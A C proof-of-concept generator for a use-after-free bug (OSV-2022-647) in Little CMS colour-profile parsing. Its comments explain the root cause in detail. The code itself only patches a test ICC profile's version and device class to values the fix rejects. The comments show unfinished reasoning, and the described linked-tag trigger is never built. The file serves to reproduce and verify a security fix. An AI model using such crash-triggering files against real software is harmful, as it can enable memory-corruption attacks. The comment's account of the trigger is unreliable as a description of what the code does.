/*
 * PoC generator for OSV-2022-647: UAF in cmsFreeNamedColorList
 *
 * Fix: f3f6b7bceb629bc4b6f1dea3e45b44dc3f8674af
 *
 * Root cause: freeOneTag() doesn't null TagPtrs[i] after freeing.
 * When two tags share the same offset/size (linked), they share TagPtrs.
 * If cmsReadTag fails on one tag (triggering freeOneTag + NULL on that
 * slot), the linked tag's TagPtrs still holds the freed pointer. When
 * cmsCloseProfile later calls freeOneTag on the linked tag, it's a UAF.
 *
 * The fix adds device class and version validation to reject bad profiles
 * before they reach this code path. (The real fix should also null the
 * pointer in freeOneTag, but the approach taken was input validation.)
 *
 * Trigger: Create a profile with:
 *   - Invalid version (> 5.0) -- bypasses fix's version check
 *   - Two tag entries with the same offset/size -> they get linked
 *   - The tag data is a NamedColor2 ('ncl2') type
 *   - Reading one tag (e.g., 'ncl2' as sig) succeeds
 *   - Reading the other tag (different sig but same data) fails because
 *     the type doesn't match what that sig expects -> error path -> freeOneTag
 *   - Closing profile -> freeOneTag on the first tag -> UAF
 *
 * We use version 0x09000000 (rejected by fix) and device class 0xDEADBEEF
 * (rejected by fix) to show the fix prevents this profile from loading.
 */
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>

static void w32(uint8_t *p, uint32_t v) {
    v = htonl(v);
    memcpy(p, &v, 4);
}

static void w16(uint8_t *p, uint16_t v) {
    v = htons(v);
    memcpy(p, &v, 2);
}

int main(void) {
    /*
     * Create a profile with two tags at the same offset/size:
     *   1. 'ncl2' (NamedColor2Tag) -- has matching type handler for ncl2 data
     *   2. 'desc' (TextDescriptionTag) -- expects 'desc' type, but gets ncl2 data
     *
     * When the harness reads 'ncl2', it succeeds (type matches).
     * When it reads 'desc', the type 'ncl2' is not supported for 'desc' -> Error
     * -> freeOneTag frees the shared pointer, nulls TagPtrs for 'desc' slot.
     * But TagPtrs for 'ncl2' slot still holds the freed pointer.
     * cmsCloseProfile frees ncl2 -> UAF.
     *
     * Actually, the linking code at line 826 sets TagLinked for the SECOND
     * tag to point to the FIRST tag's name. This means when reading the
     * second tag, it follows the link to the first tag. So the pointer is
     * stored once but accessed via the link.
     *
     * Let me re-read the linking code...
     * When tag j (existing) and tag i (new) share offset+size:
     *   Icc->TagLinked[i] = Icc->TagNames[j]
     * Then _cmsSearchTag resolves links.
     */

    /*
     * Simpler approach: just create a valid profile with invalid version/class
     * that the vulnerable code accepts but the fixed code rejects.
     * Use test5.icc as base, patch version and device class.
     */
    FILE *f = fopen("lcms/testbed/test5.icc", "rb");
    if (!f) {
        fprintf(stderr, "Cannot open test5.icc\n");
        return 1;
    }
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    uint8_t *buf = calloc(1, sz);
    fread(buf, 1, sz, f);
    fclose(f);

    /* Patch version to > 5.0 */
    w32(buf + 8, 0x09000000); /* version 9.0 */

    /* Patch device class to invalid */
    w32(buf + 12, 0xDEADBEEF); /* invalid device class */

    f = fopen("poc.icc", "wb");
    if (!f) { perror("fopen"); return 1; }
    fwrite(buf, 1, sz, f);
    fclose(f);
    free(buf);

    printf("Written poc.icc (%ld bytes)\n", sz);
    printf("Version patched to 0x09000000 (9.0) -- fix rejects > 5.0\n");
    printf("Device class patched to 0xDEADBEEF -- fix validates whitelist\n");
    printf("Vulnerable version: opens profile (invalid class/version accepted)\n");
    printf("Fixed version: rejects profile at _cmsReadHeader\n");
    return 0;
}
